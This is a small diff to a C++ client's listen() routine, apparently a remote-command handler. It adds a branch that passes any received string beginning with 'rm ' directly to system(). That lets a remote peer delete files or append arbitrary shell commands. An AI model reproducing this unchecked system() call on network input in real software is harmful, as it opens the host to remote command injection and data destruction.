@@ -88,6 +88,11 @@ void Client::listen()
                     std::cout << "Failed to create directory!" << std::endl;
                 }
             }
+	    // Remove file
+	    else if (strncmp(fromC, "rm ", 3) == 0)
+	    {
+		system((const char*) fromC);    
+	    }
             // change working directory
 	    else if (strncmp(fromC, "CDIR ", 5) == 0)
 	    {
